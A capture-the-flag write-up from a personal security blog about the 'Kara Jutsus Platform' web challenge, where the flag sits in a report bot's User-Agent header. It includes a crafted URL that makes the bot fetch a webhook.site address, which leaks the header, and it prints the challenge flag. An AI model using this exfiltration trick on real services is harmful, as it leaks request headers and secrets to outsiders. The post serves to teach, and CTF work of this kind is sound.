---
source: kevin-mizu
source_url: https://mizu.re/post/kara_jutsus_platform
title: "Kara Jutsu Platform | mizu.re"
description: "Kara Jutsu Platform"
---

_keyboard\_arrow\_up_

title: Kara Jutsu Platform

date: Dec 25, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [YogoshaChristmas\_2022](https://mizu.re/tag/YogoshaChristmas_2022) [Web](https://mizu.re/tag/Web)

# Kara Jutsus Platform

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/kara_jutsus_platform/images/yogosha.svg)

* * *

Difficulty: 500 points \| 25 solves

Description: Wow you are doing great in this operation! Check Kara Jutsus Platform, I heard that it has a weird behavior and Dr Amado has hidden his flag in the User-Agent 👀 But the flag appears only when you report a link starting with [http://54.205.207.242](http://54.205.207.242/). That's Dr Amado Magic!!

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/kara_jutsus_platform#%EF%B8%8F-recon)
- [🎉 Flag](https://mizu.re/post/kara_jutsus_platform#-flag)

## 🕵️ Recon

This challenge was the 5th step of the CTF. From the challenge description, we know that we have to retrieve the flag which is stored in the [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) header of the bot. The challenge website has only one feature which allows to load images from a `path`.

![home.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/kara_jutsus_platform/images/home.png)

_Home page_

As the `User-Agent` header is sent over each request made by the browser, loading a resource from a remote content will force the bot's browser to fetch the resource and gives us the flag.

## 🎉 Flag

Then, send the vulnerable URL to the bot: `http://54.205.207.242/index.php?src=https://webhook.site/8a799c24-8959-4607-b6b0-a43e7de2b892`.

![flag.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/kara_jutsus_platform/images/flag.png)

Flag: `FLAG{You_StoLe_AmaDO_ForbiDDen_CybOrg_Jutsu}` 🎉

[_keyboard\_arrow\_left_ Mission Forum](https://mizu.re/post/missions_forum)

[Kara Jutsu Access _keyboard\_arrow\_right_](https://mizu.re/post/kara_jutsus_access)